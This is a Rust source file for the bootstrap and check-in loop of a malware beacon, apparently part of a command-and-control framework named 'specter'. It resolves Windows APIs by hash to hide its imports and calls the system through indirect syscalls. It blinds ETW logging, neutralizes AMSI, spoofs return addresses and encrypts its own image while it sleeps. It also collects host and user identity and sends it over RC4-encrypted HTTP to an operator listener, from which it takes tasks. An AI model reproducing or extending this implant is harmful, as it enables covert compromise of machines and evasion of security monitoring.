//! Beacon bootstrap and main cycle (port of `src_beacon/src/runtime/`).
//!
//! `spt_main`: resolve the core modules and APIs by FNV-64 hash through the
//! PEB (no import table), build the indirect-syscall table (Hell's Gate /
//! Tartarus' Gate / Hell's Hall), store the instance in
//! `TEB->NtTib.ArbitraryUserPointer` (no globals, fully reentrant), run the
//! killswitch check, then loop on obfuscated-by-indirection sleep cycles
//! with jitter (`NtDelayExecution` through a rotating ntdll gadget — the
//! `syscall` instruction never runs from beacon memory). Exits are silent
//! through `RtlExitUserThread(0)`.

use core::ffi::c_void;

use specter_core::beat::BeatData;
use specter_core::config;
use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
use specter_core::heap::{self, GetProcessHeapFn, HeapAllocFn, HeapFreeFn};
use specter_core::hwbp::Hooks;
use specter_core::peb::{self, Peb};
use specter_core::rc4::Rc4;
use specter_core::rng::XorShift64;
use specter_core::sleep::sleep_with_jitter;
use specter_core::sleepmask::SleepMaskParams;
use specter_core::syscalls::{ms_to_delay_interval, pick_gadget};
use specter_core::time::{filetime_to_unix_epoch, is_expired};
use specter_core::transport::{self, Task};
use specter_core::wire::Writer;

use crate::runtime::hwbp as beacon_hwbp;

use crate::runtime::syscalls::{self, Syscalls};
use crate::runtime::winhttp::{self, Request, WinHttp};

/// Beacon instance (port of `SPT_INSTANCE`): the single per-beacon state,
/// stored in `TEB->NtTib.ArbitraryUserPointer` and passed explicitly to
/// everything — never a global.
pub struct Instance {
    pub watermark: u32,
    pub ntdll: *mut c_void,
    pub kernel32: *mut c_void,
    /// Process heap: `None` when the kernel32 trio did not resolve (the
    /// heap is optional until phase 3 buffering needs it).
    pub heap: Option<heap::Heap>,
    pub syscalls: Syscalls,
    /// ETW blinding hooks (Dr slots; disabled slots are zero).
    pub etw_hooks: Hooks,
    /// Return-address spoofing gadget (JMP [RBX] in a signed DLL),
    /// 0 = unavailable (calls go direct).
    pub retspoof_gadget: usize,
    /// Encrypted sleep mask parameters; None = plain indirect sleep.
    pub sleep_mask: Option<SleepMaskParams>,
    pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
    pub exit_thread: unsafe extern "system" fn(u32),
    pub rng: XorShift64,
    /// WinHTTP surface; `None` = networkless run (silent sleep cycles).
    pub winhttp: Option<WinHttp>,
    /// Identity collected once at bootstrap; drives every beat.
    pub sysinfo: crate::runtime::sysinfo::SysInfo,
    /// Session RC4 key + agent id (stable for the whole run).
    pub session_key: [u8; 32],
    pub agent_id: u32,
    /// Runtime sleep (operator-adjustable through COMMAND_PROFILE):
    /// interval in ms, jitter in percent (the native wire unit).
    pub sleep_ms: u32,
    pub jitter_pct: u32,
    /// Check-in counter (sequential URI rotation).
    pub cycle: u32,
    /// Task results queued for the next POST body (u32 BE size || records).
    pub results: [u8; 512],
    pub results_len: usize,
}

/// Module name hashes, computed at compile time (lowercase; resolution is
/// case-insensitive — see fnv1a64_utf16_ci).
const H_NTDLL: u64 = fnv1a64_wide_ascii_ci("ntdll.dll");
const H_KERNEL32: u64 = fnv1a64_wide_ascii_ci("kernel32.dll");

/// ntdll export hashes.
const H_RTL_EXIT_USER_THREAD: u64 = fnv1a64(b"RtlExitUserThread");

/// kernel32 export hashes.
const H_GET_PROCESS_HEAP: u64 = fnv1a64(b"GetProcessHeap");
const H_HEAP_ALLOC: u64 = fnv1a64(b"HeapAlloc");
const H_HEAP_FREE: u64 = fnv1a64(b"HeapFree");
const H_GET_SYSTEM_TIME_AS_FILE_TIME: u64 = fnv1a64(b"GetSystemTimeAsFileTime");
const H_QUERY_PERFORMANCE_COUNTER: u64 = fnv1a64(b"QueryPerformanceCounter");

/// Read the PEB (`gs:[0x60]`).
///
/// # Safety
///
/// Windows x64 only; valid once the process has a TEB (always true when
/// the beacon runs).
#[inline]
pub unsafe fn get_peb() -> *mut Peb {
    let peb: *mut Peb;
    core::arch::asm!(
        "mov {}, qword ptr gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    peb
}

/// Store the instance in `TEB->NtTib.ArbitraryUserPointer` (`gs:[0x30]+0x28`).
///
/// # Safety
///
/// The pointer must stay valid for the beacon's lifetime; the entry stub's
/// stack frame never returns, so an instance owned by `spt_main` is valid.
#[inline]
pub unsafe fn store_instance(instance: *mut Instance) {
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov qword ptr [rcx + 0x28], {}",
        in(reg) instance,
        lateout("rcx") _,
        options(nostack),
    );
}

/// Recover the instance from the TEB (port of the `G_INSTANCE` macro).
///
/// # Safety
///
/// Only after `store_instance` ran on this thread.
#[inline]
pub unsafe fn instance() -> *mut Instance {
    let inst: *mut Instance;
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov {}, qword ptr [rcx + 0x28]",
        out(reg) inst,
        lateout("rcx") _,
        options(nostack, preserves_flags),
    );
    inst
}

/// Resolve the modules and APIs the beacon needs and build the instance.
/// Returns `None` when anything essential is missing — the caller must then
/// exit silently (or spin if even the exit is unresolvable).
unsafe fn bootstrap() -> Option<Instance> {
    let peb = get_peb();
    let ntdll = peb::find_module(peb, H_NTDLL);
    let kernel32 = peb::find_module(peb, H_KERNEL32);
    if ntdll.is_null() || kernel32.is_null() {
        return None;
    }

    // Silent exit first: everything else may fail and must still be able
    // to leave without a trace.
    let exit_thread_ptr = peb::find_export(ntdll, H_RTL_EXIT_USER_THREAD);
    if exit_thread_ptr.is_null() {
        return None;
    }
    let exit_thread = *(exit_thread_ptr as *const unsafe extern "system" fn(u32));

    // Indirect syscall table (gadgets + NtDelayExecution SSN).
    let syscall_table = syscalls::build(ntdll)?;

    let get_time_ptr = peb::find_export(kernel32, H_GET_SYSTEM_TIME_AS_FILE_TIME);
    let qpc_ptr = peb::find_export(kernel32, H_QUERY_PERFORMANCE_COUNTER);
    let get_process_heap = peb::find_export(kernel32, H_GET_PROCESS_HEAP);
    let heap_alloc = peb::find_export(kernel32, H_HEAP_ALLOC);
    let heap_free = peb::find_export(kernel32, H_HEAP_FREE);
    if get_time_ptr.is_null() || qpc_ptr.is_null() {
        return None;
    }

    // ETW blinding: resolve the hook targets and the VEH installer, then
    // install the handler and arm the debug registers. Any failure simply
    // leaves the hooks disabled — the beacon keeps running.
    let (mut etw_hooks, add_veh) = beacon_hwbp::etw_hooks(ntdll, kernel32);
    if add_veh != 0
        && syscall_table.get_ctx_ssn != u32::MAX
        && syscall_table.set_ctx_ssn != u32::MAX
    {
        let add_veh = *(add_veh
            as *const unsafe extern "system" fn(
                u32,
                *mut core::ffi::c_void,
            ) -> *mut core::ffi::c_void);
        beacon_hwbp::install(&syscall_table, &etw_hooks, add_veh);
    }

    // Return-address spoofing gadget: mask the beacon's presence in API
    // stack walks. Unavailable gadget = direct calls (non-fatal).
    let retspoof_gadget = crate::runtime::retspoof::resolve_gadget(kernel32).unwrap_or(0);

    // Encrypted sleep mask: static bounds resolved once; the per-cycle
    // fields (seed, gadget, interval) refresh every sleep. Discovery
    // failure disables the mask — the beacon sleeps unencrypted rather
    // than encrypting unknown bounds.
    let mut sleep_mask = crate::runtime::sleepmask::build_params();
    if let Some(ref mut mask) = sleep_mask {
        mask.ssn = syscall_table.delay_ssn;
    }

    // AMSI neutralization: hook now if amsi.dll is mapped, defer the rest
    // through loader notifications (Dr3 — the ETW hooks left it free).
    crate::runtime::amsi::install(peb, ntdll, &syscall_table, &mut etw_hooks);

    // Seed the jitter RNG from the performance counter; a failed read falls
    // back to the remapped zero seed (never zero-stuck).
    let mut counter: i64 = 0;
    let rng =
        if (*(qpc_ptr as *const unsafe extern "system" fn(*mut i64) -> i32))(&mut counter) != 0 {
            XorShift64::new(counter as u64)
        } else {
            XorShift64::new(0)
        };

    // The heap is optional at this stage (first use is phase 3 file/wire
    // buffering): a missing Heap trio is not fatal.
    let heap = if get_process_heap.is_null() || heap_alloc.is_null() || heap_free.is_null() {
        None
    } else {
        Some(heap::Heap {
            handle: (*(get_process_heap as *const GetProcessHeapFn))(),
            alloc: *(heap_alloc as *const HeapAllocFn),
            free: *(heap_free as *const HeapFreeFn),
        })
    };

    // Session identity (the beat's SessionKey field and the routing id):
    // generated per run, stable for the whole session.
    let mut rng = rng;
    let mut session_key = [0u8; 32];
    let mut i = 0;
    while i < 32 {
        session_key[i] = rng.next_u64() as u8;
        i += 1;
    }
    let agent_id = (rng.next_u64() >> 32) as u32;

    // Runtime profile: the compiled values, expressed in the native wire
    // units (interval ms, jitter percent) the sleep command updates.
    let jitter_pct = (config::JITTER_MS * 100)
        .checked_div(config::SLEEP_MS)
        .unwrap_or(0);

    Some(Instance {
        watermark: config::WATERMARK,
        ntdll,
        kernel32,
        heap,
        syscalls: syscall_table,
        etw_hooks,
        retspoof_gadget,
        sleep_mask,
        get_system_time_as_file_time: *(get_time_ptr as *const unsafe extern "system" fn(*mut u64)),
        exit_thread,
        rng,
        winhttp: winhttp::resolve(peb, kernel32),
        sysinfo: crate::runtime::sysinfo::collect(peb),
        session_key,
        agent_id,
        sleep_ms: config::SLEEP_MS,
        jitter_pct,
        cycle: 0,
        // Never read before the first cycle writes it (results_len = 0):
        // the uninit array below cannot be observed. The lint is silenced
        // per-site; the invariant is documented at each buffer.
        #[allow(invalid_value, clippy::uninit_assumed_init)]
        results: core::mem::MaybeUninit::uninit().assume_init(),
        results_len: 0,
    })
}

/// Read the current Unix epoch through the resolved clock — spoofed
/// through the JMP [RBX] gadget when available, so the stack walk of the
/// call shows a signed DLL as the caller.
#[inline]
unsafe fn now_epoch(instance: &Instance) -> u64 {
    let mut filetime: u64 = 0;
    if instance.retspoof_gadget != 0 {
        crate::runtime::retspoof::spt_spoof_call2(
            instance.get_system_time_as_file_time as *const () as usize,
            instance.retspoof_gadget,
            crate::runtime::retspoof::spt_retspoof_continue as *const () as usize,
            core::ptr::addr_of_mut!(filetime) as usize,
            0,
        );
    } else {
        (instance.get_system_time_as_file_time)(&mut filetime);
    }
    filetime_to_unix_epoch(filetime)
}

/// Manual bounded push (no `memcpy` — the compiler_builtins rule: every
/// copy in the blob is written by hand).
fn push_bytes(buf: &mut [u8], len: &mut usize, bytes: &[u8]) -> bool {
    if buf.len() - *len < bytes.len() {
        return false;
    }
    let mut i = 0;
    while i < bytes.len() {
        buf[*len + i] = bytes[i];
        i += 1;
    }
    *len += bytes.len();
    true
}

/// Split `host:port` (ASCII); the port defaults to 443 when absent.
fn split_host_port(s: &[u8]) -> (&[u8], u16) {
    let mut i = 0;
    while i < s.len() {
        if s[i] == b':' {
            let mut port: u32 = 0;
            let mut j = i + 1;
            while j < s.len() {
                if !s[j].is_ascii_digit() {
                    return (&s[..i], 443);
                }
                port = port * 10 + (s[j] - b'0') as u32;
                j += 1;
            }
            if port == 0 || port > 0xFFFF {
                return (&s[..i], 443);
            }
            return (&s[..i], port as u16);
        }
        i += 1;
    }
    (s, 443)
}

/// The beat of the current cycle, from the runtime profile and the
/// collected identity. Server detection (flag bit 3) remains à faire
/// (documented in PARITE.md).
fn cycle_beat<'a>(instance: &'a Instance) -> BeatData<'a> {
    BeatData {
        sleep_sec: instance.sleep_ms / 1000,
        jitter_pct: instance.jitter_pct,
        killdate: config::KILL_EPOCH as u32,
        workingtime: 0,
        acp: instance.sysinfo.acp,
        oemcp: instance.sysinfo.oemcp,
        gmt_offset: instance.sysinfo.gmt_offset,
        pid: instance.sysinfo.pid,
        tid: instance.sysinfo.tid,
        build_number: instance.sysinfo.build,
        major: instance.sysinfo.major,
        minor: instance.sysinfo.minor,
        internal_ip: instance.sysinfo.internal_ip,
        // bit0 x64 agent, bit1 x64 OS, bit2 elevated
        flags: 0b0011 | u8::from(instance.sysinfo.elevated) << 2,
        session_key: &instance.session_key,
        domain: instance.sysinfo.domain(),
        computer: instance.sysinfo.computer(),
        username: instance.sysinfo.username(),
        process: instance.sysinfo.process_name(),
    }
}

/// One full check-in transaction against the listener (docs/WIRE.md):
/// beat header + queued results out, hosted tasks in. Failures at any
/// stage leave the queued results in place for the next cycle.
///
/// # Safety
///
/// Beacon thread; instance stored in the TEB by `main`.
// The uninit lint pair is allowed here: the large stack buffers stay
// uninitialized (a zero-init would emit a memset reference — the
// compiler_builtins rule) and are fully written before any read (packer
// writes, API fills, bounded reads).
#[allow(unsafe_code, invalid_value, clippy::uninit_assumed_init)]
unsafe fn check_in_cycle(instance: &mut Instance) {
    let wh = match instance.winhttp {
        Some(wh) => wh,
        None => return,
    };
    instance.cycle = instance.cycle.wrapping_add(1);

    // Beat envelope: base64(RC4(listener_key, watermark || id || beat)).
    // Buffers stay uninitialized (memset rule) — every byte is written by
    // the packer before it is read.
    let mut scratch: [u8; 512] = core::mem::MaybeUninit::uninit().assume_init();
    let mut header_val: [u8; 720] = core::mem::MaybeUninit::uninit().assume_init();
    let header_len = match transport::beat_header(
        &cycle_beat(instance),
        &config::LISTENER_KEY,
        config::WATERMARK,
        instance.agent_id,
        &mut scratch,
        &mut header_val,
    ) {
        Some(len) => len,
        None => return,
    };

    // Header lines: the beat (listener `hb_header`) + profile headers.
    let mut headers: [u8; 1024] = core::mem::MaybeUninit::uninit().assume_init();
    let mut hl = 0usize;
    if !push_bytes(&mut headers, &mut hl, config::POST_METADATA_NAME.as_bytes())
        || !push_bytes(&mut headers, &mut hl, b": ")
        || !push_bytes(&mut headers, &mut hl, &header_val[..header_len])
        || !push_bytes(&mut headers, &mut hl, b"\r\n")
    {
        return;
    }
    let mut hi = 0;
    while hi < config::POST_HEADERS_COUNT {
        if !push_bytes(&mut headers, &mut hl, config::post_header(hi).as_bytes())
            || !push_bytes(&mut headers, &mut hl, b"\r\n")
        {
            return;
        }
        hi += 1;
    }

    // Body: RC4(session) of the framed results queued by the previous cycle.
    let mut body: [u8; 640] = core::mem::MaybeUninit::uninit().assume_init();
    let body_len = if instance.results_len > 0 {
        let n = match transport::wrap_results_frame(
            &instance.results[..instance.results_len],
            &mut body,
        ) {
            Some(n) => n,
            None => return,
        };
        Rc4::new(&instance.session_key).crypt_in_place(&mut body[..n]);
        n
    } else {
        0
    };

    let (host, port) = split_host_port(config::host(0).as_bytes());
    // URI rotation: sequential walks the list, random re-rolls each cycle.
    let uri_idx = match config::ROTATION {
        config::Rotation::Sequential => (instance.cycle as usize) % config::POST_URIS_COUNT,
        config::Rotation::Random => (instance.rng.next_u64() as usize) % config::POST_URIS_COUNT,
    };
    let request = Request {
        host,
        port,
        path: config::post_uri(uri_idx).as_bytes(),
        user_agent: config::USER_AGENT.as_bytes(),
        headers: &headers[..hl],
        body: &body[..body_len],
    };

    let mut resp: [u8; 0x4000] = core::mem::MaybeUninit::uninit().assume_init();
    let resp_len = match winhttp::post(&wh, &request, &mut resp) {
        Some(len) => len,
        None => return,
    };

    // Response page: template payload, session-decrypted in place.
    let (start, end) = match transport::extract_payload_range(
        &resp[..resp_len],
        config::POST_SERVER_OUTPUT_PREPEND.as_bytes(),
        config::POST_SERVER_OUTPUT_APPEND.as_bytes(),
    ) {
        Some(range) => range,
        None => return,
    };
    if end > start {
        Rc4::new(&instance.session_key).crypt_in_place(&mut resp[start..end]);
    }

    // Task pack: u32 LE total size, then [data || u32 LE taskId] records.
    // Large stack buffers stay uninitialized (no memset reference — the
    // compiler_builtins rule): every byte read below is written first by
    // the transport or the packer.
    let mut head = specter_core::wire::Reader::new(&resp[start..end]);
    let pack = match head.u32_le().and_then(|total| head.take(total as usize)) {
        Some(pack) => pack,
        None => return,
    };
    let mut r = specter_core::wire::Reader::new(pack);

    // Dispatch + queue the acknowledgements for the next cycle.
    let mut results: [u8; 512] = core::mem::MaybeUninit::uninit().assume_init();
    let mut w = Writer::new(&mut results);
    if !transport::begin_results(&mut w) {
        return;
    }
    while r.remaining() >= 8 {
        match transport::parse_task(&mut r) {
            Some((Task::Sleep { sec, jitter_pct }, id)) => {
                instance.sleep_ms = sec.saturating_mul(1000);
                instance.jitter_pct = jitter_pct;
                if !transport::push_sleep_result(&mut w, id, sec, jitter_pct) {
                    break;
                }
            }
            Some((Task::Terminate, _)) => {
                syscalls::exit_thread(instance.exit_thread);
            }
            None => break, // unknown command: drop the rest (stays hosted)
        }
    }
    if !transport::finish_results(&mut w) {
        return;
    }
    // Manual copy (memcpy rule): only the written prefix moves to the
    // instance.
    let n = w.written();
    let mut i = 0;
    while i < n {
        instance.results[i] = results[i];
        i += 1;
    }
    instance.results_len = n;
}

/// Beacon main, called by the entry stub. Never returns.
///
/// # Safety
///
/// Only reachable through `SptEntry`: no arguments, no return.
pub unsafe fn main() -> ! {
    let mut instance = match bootstrap() {
        Some(instance) => instance,
        // Essential resolution failed. If even the silent exit is
        // unresolvable there is no clean option: freeze without touching
        // anything else.
        None => loop {
            core::hint::spin_loop();
        },
    };
    store_instance(&mut instance);

    loop {
        // Killswitch: checked once here (bootstrap, before any network
        // activity) and again after every sleep cycle.
        if config::KILL_EPOCH != 0 && is_expired(config::KILL_EPOCH, now_epoch(&instance)) {
            syscalls::exit_thread(instance.exit_thread);
        }

        // One check-in transaction (beat + queued results in, hosted tasks
        // out). Transport failures are not fatal — the cycle sleeps and
        // retries.
        check_in_cycle(&mut instance);

        // Jittered sleep interval (runtime profile, COMMAND_PROFILE
        // adjustable).
        let jitter_ms = instance.sleep_ms.saturating_mul(instance.jitter_pct) / 100;
        let ms = sleep_with_jitter(instance.sleep_ms, jitter_ms, instance.rng.next_u32());
        let interval = ms_to_delay_interval(ms);

        // Hell's Hall: a new gadget every cycle, so the syscall never
        // executes from the same ntdll address twice in a row.
        let g = pick_gadget(instance.syscalls.gadget_count, instance.rng.next_u32());
        let gadget = syscalls::gadget(&instance.syscalls, g);
        let delay_ssn = instance.syscalls.delay_ssn;
        let seed = instance.rng.next_u64();

        if let Some(ref mut mask) = instance.sleep_mask {
            // Encrypted sleep: the whole image goes through the keystream
            // while the thread is inside NtDelayExecution.
            mask.seed = seed;
            mask.gadget = gadget as usize;
            mask.interval = interval;
            crate::runtime::sleepmask::spt_sleepmask(core::ptr::from_ref(mask) as usize);
        } else {
            // Plain indirect sleep (mask discovery failed).
            let mut interval = interval;
            let status = syscalls::indirect_syscall2(
                delay_ssn,
                gadget,
                0,
                &mut interval as *mut i64 as usize,
            );
            // A failing sleep is not fatal: keep the cycle going.
            let _ = status;
        }
    }
}
